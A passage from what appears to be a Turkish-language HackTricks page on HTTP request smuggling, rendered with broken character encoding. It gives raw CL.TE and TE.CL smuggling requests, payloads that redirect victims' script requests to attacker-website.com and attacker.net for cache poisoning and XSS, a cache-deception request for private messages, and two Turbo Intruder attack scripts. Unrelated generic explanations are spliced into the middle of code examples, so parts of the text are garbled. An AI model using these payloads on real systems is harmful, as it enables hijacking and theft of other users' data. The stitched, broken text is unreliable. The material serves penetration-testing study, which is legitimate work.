Content-Type: application/x-www-form-urlencoded

A=
```
Bu payload, zafiyeti sÃ¶mÃ¼rmek iÃ§in aÅŸaÄŸÄ±daki ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r:

1. `Transfer-Encoding: chunked` baÅŸlÄ±ÄŸÄ±yla baÅŸlayan, gÃ¶rÃ¼nÃ¼ÅŸte tipik bir `POST` isteÄŸi baÅŸlatÄ±lÄ±r ve bu, smuggling'in baÅŸlangÄ±cÄ±nÄ± gÃ¶sterir.
2. Chunked mesaj gÃ¶vdesinin sonunu belirleyen `0` takip eder.
3. ArdÄ±ndan, `User-Agent` baÅŸlÄ±ÄŸÄ±na `<script>alert(1)</script>` betiÄŸi enjekte edilmiÅŸ bir smuggling `GET` isteÄŸi tanÄ±tÄ±lÄ±r ve sunucu bu sonraki isteÄŸi iÅŸlediÄŸinde XSS tetiklenir.

Smuggling aracÄ±lÄ±ÄŸÄ±yla `User-Agent` manipÃ¼le edilerek, payload normal istek kÄ±sÄ±tlamalarÄ±nÄ± bypass eder ve bÃ¶ylece Reflected XSS zafiyetini standart olmayan ancak etkili bir ÅŸekilde sÃ¶mÃ¼rÃ¼r.

### Bir site iÃ§i yÃ¶nlendirmeyi aÃ§Ä±k bir yÃ¶nlendirmeye dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in HTTP isteÄŸi smuggling kullanma <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### HTTP Ä°steÄŸi Smuggling ile Site Ä°Ã§i YÃ¶nlendirmeleri SÃ¶mÃ¼rme <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Uygulamalar genellikle bir URL'den baÅŸka bir URL'ye yÃ¶nlendirme yapmak iÃ§in yÃ¶nlendirme URL'sindeki `Host` baÅŸlÄ±ÄŸÄ±nÄ± kullanÄ±r. Bu, Apache ve IIS gibi web sunucularÄ±nda yaygÄ±ndÄ±r. Ã–rneÄŸin, bir dizin isteÄŸi, sonunda bir eÄŸik Ã§izgi olmadan bir yÃ¶nlendirmeye neden olur:
```
GET /home HTTP/1.1
Host: normal-website.com
```
# HTTP Ä°stek Smugglingi

Bu teknik, bir web uygulamasÄ±nda HTTP isteklerinin iÅŸlenmesi sÄ±rasÄ±nda ortaya Ã§Ä±kan bir gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan yararlanÄ±r. HTTP istek smugglingi, bir saldÄ±rganÄ±n isteklerin hedef sunucu tarafÄ±ndan yanlÄ±ÅŸ yorumlanmasÄ±na neden olmasÄ±nÄ± saÄŸlar.

## NasÄ±l Ã‡alÄ±ÅŸÄ±r?

HTTP istek smugglingi genellikle iki aÅŸamalÄ± bir saldÄ±rÄ±dÄ±r:

1. Ä°lk aÅŸamada, saldÄ±rgan, hedef sunucuya gÃ¶nderilen isteklerin iÅŸlenmesini etkilemek iÃ§in bir hata kullanÄ±r. Bu hata, sunucunun istekleri yanlÄ±ÅŸ yorumlamasÄ±na veya yanÄ±tlarÄ±n yanlÄ±ÅŸ bir ÅŸekilde yÃ¶nlendirilmesine neden olabilir.

2. Ä°kinci aÅŸamada, saldÄ±rgan, hedef sunucunun istekleri yanlÄ±ÅŸ yorumlamasÄ±nÄ± veya yanÄ±tlarÄ± yanlÄ±ÅŸ yÃ¶nlendirmesini kullanarak, gÃ¼venlik duvarÄ±nÄ± veya diÄŸer gÃ¼venlik Ã¶nlemlerini atlayarak saldÄ±rÄ± gerÃ§ekleÅŸtirir.

## HTTP Ä°stek Smugglingi TÃ¼rleri

HTTP istek smugglingi iÃ§in farklÄ± teknikler vardÄ±r. Ä°ÅŸte bazÄ± yaygÄ±n kullanÄ±lan teknikler:

- **CL.TE Smuggling**: Bu teknik, "Content-Length" ve "Transfer-Encoding" baÅŸlÄ±klarÄ±nÄ±n kombinasyonunu kullanÄ±r. SaldÄ±rgan, sunucunun istekleri yanlÄ±ÅŸ yorumlamasÄ±nÄ± saÄŸlamak iÃ§in bu baÅŸlÄ±klarÄ± manipÃ¼le eder.

- **TE.CL Smuggling**: Bu teknik, "Transfer-Encoding" ve "Content-Length" baÅŸlÄ±klarÄ±nÄ±n kombinasyonunu kullanÄ±r. SaldÄ±rgan, sunucunun istekleri yanlÄ±ÅŸ yorumlamasÄ±nÄ± saÄŸlamak iÃ§in bu baÅŸlÄ±klarÄ± manipÃ¼le eder.

- **Chunked Body Smuggling**: Bu teknik, "Transfer-Encoding" baÅŸlÄ±ÄŸÄ±nÄ± kullanÄ±r ve saldÄ±rganÄ±n istek gÃ¶vdesini parÃ§alara bÃ¶lmek iÃ§in "chunked" kodlamasÄ±nÄ± kullanmasÄ±nÄ± gerektirir.

## SaldÄ±rÄ± Tespiti ve Ã–nleme

HTTP istek smugglingi saldÄ±rÄ±larÄ±nÄ± tespit etmek ve Ã¶nlemek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Web uygulamanÄ±zÄ± dÃ¼zenli olarak gÃ¼ncelleyin ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± gidermek iÃ§in yamalarÄ± uygulayÄ±n.

2. Web uygulamanÄ±zÄ± gÃ¼venlik testlerine tabi tutun ve zayÄ±f noktalarÄ± tespit etmek iÃ§in bir pentest gerÃ§ekleÅŸtirin.

3. Web sunucunuzda gÃ¼venlik duvarÄ± ve WAF (Web Uygulama GÃ¼venlik DuvarÄ±) gibi gÃ¼venlik Ã¶nlemleri kullanÄ±n.

4. HTTP isteklerini doÄŸru bir ÅŸekilde iÅŸleyen bir proxy sunucusu kullanarak saldÄ±rÄ±larÄ± engelleyin.

5. Web sunucunuzun gÃ¼nlÃ¼klerini dÃ¼zenli olarak kontrol edin ve ÅŸÃ¼pheli aktiviteleri tespit etmek iÃ§in bir SIEM (GÃ¼venlik Olay ve Ä°ncident YÃ¶netimi) Ã§Ã¶zÃ¼mÃ¼ kullanÄ±n.

HTTP istek smugglingi saldÄ±rÄ±larÄ±na karÅŸÄ± dikkatli olmak ve gÃ¼venlik Ã¶nlemlerini uygulamak, web uygulamanÄ±zÄ± bu tÃ¼r saldÄ±rÄ±lardan koruyacaktÄ±r.
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
GÃ¶rÃ¼nÃ¼ÅŸte zararsÄ±z olsa da, bu davranÄ±ÅŸ HTTP isteklerini sÄ±zdÄ±rarak kullanÄ±cÄ±larÄ± harici bir siteye yÃ¶nlendirmek iÃ§in manipÃ¼le edilebilir. Ã–rneÄŸin:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Bu kaÃ§ak istek, iÅŸlenen sonraki kullanÄ±cÄ± isteÄŸinin bir saldÄ±rgan tarafÄ±ndan kontrol edilen bir web sitesine yÃ¶nlendirilmesine neden olabilir:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
# HTTP Ä°stek Smugglingi

Bu teknik, bir web uygulamasÄ±nda HTTP isteklerinin iÅŸlenmesi sÄ±rasÄ±nda ortaya Ã§Ä±kan bir gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan yararlanÄ±r. HTTP istek smugglingi saldÄ±rÄ±sÄ±, bir saldÄ±rganÄ±n hedef web sunucusuna yanÄ±t olarak farklÄ± bir ÅŸekilde yorumlanan iki veya daha fazla HTTP isteÄŸi gÃ¶ndermesini iÃ§erir.

## HTTP Ä°stek Smugglingi NasÄ±l Ã‡alÄ±ÅŸÄ±r?

HTTP istek smugglingi saldÄ±rÄ±sÄ±, genellikle web sunucusu ve Ã¶n uÃ§ sunucu (Ã¶rneÄŸin bir yÃ¼k dengeleyici) arasÄ±ndaki iletiÅŸimdeki farklÄ±lÄ±klardan kaynaklanÄ±r. Bu farklÄ±lÄ±klar, saldÄ±rganÄ±n istekleri hedef sunucuya yanÄ±t olarak farklÄ± ÅŸekillerde yorumlamasÄ±na izin verir.

SaldÄ±rgan, hedef web sunucusuna gÃ¶nderilen isteklerin bir kÄ±smÄ±nÄ± manipÃ¼le ederek, sunucunun bu istekleri yanÄ±tlarken farklÄ± bir ÅŸekilde yorumlamasÄ±nÄ± saÄŸlar. Bu, saldÄ±rganÄ±n gÃ¼venlik duvarÄ±nÄ± aÅŸmasÄ±na, oturumlarÄ± ele geÃ§irmesine veya hassas verilere eriÅŸmesine olanak tanÄ±r.

## HTTP Ä°stek Smugglingi TÃ¼rleri

HTTP istek smugglingi saldÄ±rÄ±larÄ± farklÄ± ÅŸekillerde gerÃ§ekleÅŸtirilebilir. Ä°ÅŸte bazÄ± yaygÄ±n saldÄ±rÄ± tÃ¼rleri:

- **CL.TE Smugglingi**: Bu saldÄ±rÄ± tÃ¼rÃ¼nde, saldÄ±rgan bir isteÄŸi "Content-Length" ve "Transfer-Encoding" baÅŸlÄ±klarÄ±nÄ± manipÃ¼le ederek hedef sunucuya gÃ¶nderir. Bu, sunucunun isteÄŸi yanÄ±tlarken farklÄ± ÅŸekillerde yorumlamasÄ±na neden olabilir.

- **TE.CL Smugglingi**: Bu saldÄ±rÄ± tÃ¼rÃ¼nde, saldÄ±rgan bir isteÄŸi "Transfer-Encoding" ve "Content-Length" baÅŸlÄ±klarÄ±nÄ± manipÃ¼le ederek hedef sunucuya gÃ¶nderir. Bu da sunucunun isteÄŸi yanÄ±tlarken farklÄ± ÅŸekillerde yorumlamasÄ±na yol aÃ§abilir.

- **Chunked Body Smugglingi**: Bu saldÄ±rÄ± tÃ¼rÃ¼nde, saldÄ±rgan bir isteÄŸi "Transfer-Encoding" baÅŸlÄ±ÄŸÄ±nÄ± manipÃ¼le ederek hedef sunucuya gÃ¶nderir. Bu, sunucunun isteÄŸi yanÄ±tlarken farklÄ± ÅŸekillerde yorumlamasÄ±na neden olabilir.

## HTTP Ä°stek Smugglingi SaldÄ±rÄ±sÄ±nÄ± Ã–nleme

HTTP istek smugglingi saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± takip edebilirsiniz:

- Web sunucusu ve Ã¶n uÃ§ sunucu arasÄ±ndaki iletiÅŸimi dÃ¼zgÃ¼n bir ÅŸekilde yapÄ±landÄ±rÄ±n ve gÃ¼ncelleyin.

- Web sunucusunda gÃ¼venlik duvarÄ± ve filtreleme Ã¶nlemleri uygulayÄ±n.

- Web uygulamasÄ±nÄ± dÃ¼zenli olarak gÃ¼ncelleyin ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± dÃ¼zeltin.

- HTTP isteklerini doÄŸrulamak ve doÄŸrulanmamÄ±ÅŸ istekleri reddetmek iÃ§in uygun gÃ¼venlik Ã¶nlemlerini uygulayÄ±n.

## Daha Fazla Bilgi

Daha fazla bilgi iÃ§in [HTTP Ä°stek Smugglingi](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling) bÃ¶lÃ¼mÃ¼nÃ¼ ziyaret edebilirsiniz.
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
Bu senaryoda, bir kullanÄ±cÄ±nÄ±n JavaScript dosyasÄ± isteÄŸi ele geÃ§irilir. SaldÄ±rgan, yanÄ±t olarak kÃ¶tÃ¼ amaÃ§lÄ± JavaScript sunarak kullanÄ±cÄ±nÄ±n tehlikeye girmesine neden olabilir.


### Web Ã–nbellek Zehirlenmesi Ä°Ã§in HTTP Ä°stek KaÃ§Ä±rma Kullanma <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### HTTP Ä°stek KaÃ§Ä±rma ile Web Ã–nbellek Zehirlenmesi SÃ¶mÃ¼rÃ¼sÃ¼ <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web Ã¶nbellek zehirlenmesi, genellikle performansÄ± artÄ±rmak iÃ§in **Ã¶n uÃ§ altyapÄ±sÄ±nÄ±n iÃ§eriÄŸi Ã¶nbelleÄŸe almasÄ±** durumunda gerÃ§ekleÅŸtirilebilir. Sunucunun yanÄ±tÄ±nÄ± manipÃ¼le ederek, **Ã¶nbelleÄŸi zehirlemek** mÃ¼mkÃ¼ndÃ¼r.

Daha Ã¶nce, sunucu yanÄ±tlarÄ±nÄ±n bir 404 hatasÄ± dÃ¶ndÃ¼rmek Ã¼zere deÄŸiÅŸtirilebileceÄŸini gÃ¶zlemlemiÅŸtik (bkz. [Temel Ã–rnekler](./#basic-examples)). Benzer ÅŸekilde, sunucuyu `/static/include.js` isteÄŸi iÃ§in `/index.html` iÃ§eriÄŸini yanÄ±t olarak teslim etmeye kandÄ±rmak mÃ¼mkÃ¼ndÃ¼r. SonuÃ§ olarak, `/static/include.js` iÃ§eriÄŸi, Ã¶nbellekte `/index.html` ile deÄŸiÅŸtirilir ve kullanÄ±cÄ±lara eriÅŸilemez hale gelir, bu da Potansiyel olarak Hizmet Reddi (DoS) saldÄ±rÄ±sÄ±na yol aÃ§abilir.

Bu teknik, bir **AÃ§Ä±k YÃ¶nlendirme aÃ§Ä±ÄŸÄ±** keÅŸfedildiÄŸinde veya bir **aÃ§Ä±k yÃ¶nlendirmeye yÃ¶nlendirme** olduÄŸunda Ã¶zellikle etkili hale gelir. Bu tÃ¼r gÃ¼venlik aÃ§Ä±klarÄ±, `/static/include.js` Ã¶nbelleÄŸindeki iÃ§eriÄŸi saldÄ±rganÄ±n kontrolÃ¼ndeki bir betikle deÄŸiÅŸtirmek iÃ§in sÃ¶mÃ¼rÃ¼lebilir ve gÃ¼ncellenen `/static/include.js` isteÄŸinde bulunan tÃ¼m istemcilere karÅŸÄ± yaygÄ±n bir Ã‡apraz Site Komut DosyasÄ± (XSS) saldÄ±rÄ±sÄ±nÄ± mÃ¼mkÃ¼n kÄ±lar.

AÅŸaÄŸÄ±da, **bir aÃ§Ä±k yÃ¶nlendirmeye yÃ¶nlendirme ile Ã¶nbellek zehirlenmesinin sÃ¶mÃ¼rÃ¼lmesi**nin bir Ã¶rneÄŸi verilmiÅŸtir. AmaÃ§, `/static/include.js` Ã¶nbellek iÃ§eriÄŸini saldÄ±rganÄ±n kontrol ettiÄŸi JavaScript kodunu sunacak ÅŸekilde deÄŸiÅŸtirmektir:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Not edin `/post/next?postId=3` hedef alan gÃ¶mÃ¼lÃ¼ bir isteÄŸi. Bu istek, alan adÄ±nÄ± belirlemek iÃ§in **Host baÅŸlÄ±k deÄŸerini** kullanarak `/post?postId=4`'e yÃ¶nlendirilecektir. **Host baÅŸlÄ±ÄŸÄ±nÄ±** deÄŸiÅŸtirerek, saldÄ±rgan isteÄŸi kendi alan adÄ±na yÃ¶nlendirebilir (**yerinde yÃ¶nlendirme ile aÃ§Ä±k yÃ¶nlendirme**).

BaÅŸarÄ±lÄ± bir **soket zehirlenmesi**nden sonra, `/static/include.js` iÃ§in bir **GET isteÄŸi** baÅŸlatÄ±lmalÄ±dÄ±r. Bu istek, Ã¶nceki **yerinde yÃ¶nlendirme ile aÃ§Ä±k yÃ¶nlendirme** isteÄŸi tarafÄ±ndan kirletilecek ve saldÄ±rgan tarafÄ±ndan kontrol edilen betiÄŸin iÃ§eriÄŸini alacaktÄ±r.

ArdÄ±ndan, `/static/include.js` iÃ§in yapÄ±lan herhangi bir istek, saldÄ±rganÄ±n betiÄŸinin Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ iÃ§eriÄŸini sunacak ve etkili bir XSS saldÄ±rÄ±sÄ± baÅŸlatacaktÄ±r.


### Web Ã¶nbellek aldatma iÃ§in HTTP isteÄŸi kaÃ§Ä±rma kullanma <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Web Ã¶nbellek zehirlenmesi ile web Ã¶nbellek aldatma arasÄ±ndaki fark nedir?**
>
> * **Web Ã¶nbellek zehirlenmesi**nde, saldÄ±rgan uygulamanÄ±n Ã¶nbelleÄŸine bazÄ± kÃ¶tÃ¼ amaÃ§lÄ± iÃ§eriklerin depolanmasÄ±na neden olur ve bu iÃ§erik Ã¶nbellekten diÄŸer uygulama kullanÄ±cÄ±larÄ±na sunulur.
> * **Web Ã¶nbellek aldatma**da, saldÄ±rgan uygulamanÄ±n Ã¶nbelleÄŸine baÅŸka bir kullanÄ±cÄ±ya ait bazÄ± hassas iÃ§eriklerin depolanmasÄ±na neden olur ve saldÄ±rgan daha sonra bu iÃ§eriÄŸi Ã¶nbellekten alÄ±r.

SaldÄ±rgan, hassas kullanÄ±cÄ±ya Ã¶zgÃ¼ iÃ§eriÄŸi almak iÃ§in kaÃ§Ä±rÄ±lmÄ±ÅŸ bir istek oluÅŸturur. AÅŸaÄŸÄ±daki Ã¶rneÄŸi dÃ¼ÅŸÃ¼nÃ¼n:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
EÄŸer bu kaÃ§ak istek, statik iÃ§erik iÃ§in Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ bir Ã¶ÄŸeyi zehirlerse (Ã¶rneÄŸin, `/someimage.png`), kurbanÄ±n `/private/messages` dizinindeki hassas verileri, statik iÃ§eriÄŸin Ã¶nbellek giriÅŸi altÄ±nda Ã¶nbelleÄŸe alÄ±nabilir. SonuÃ§ olarak, saldÄ±rgan bu Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ hassas verilere eriÅŸebilir.

### HTTP YanÄ±tÄ± AyrÄ±ÅŸtÄ±rma ile HTTP Ä°stek KaÃ§akÃ§Ä±lÄ±ÄŸÄ±nÄ± SilahlandÄ±rma

HTTP Ä°stek KaÃ§akÃ§Ä±lÄ±ÄŸÄ± zafiyeti buldunuz ve nasÄ±l istismar edeceÄŸinizi bilmiyor musunuz? Ä°ÅŸte baÅŸka bir istismar yÃ¶ntemi deneyin:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Turbo intruder betikleri

### CL.TE

Kaynak: [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Kaynak: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## AraÃ§lar

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Bu araÃ§, tuhaf istek smuggling farklÄ±lÄ±klarÄ±nÄ± bulmak iÃ§in kullanÄ±ÅŸlÄ± bir dilbilgisi tabanlÄ± HTTP Fuzzer'dÄ±r.

## Referanslar

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
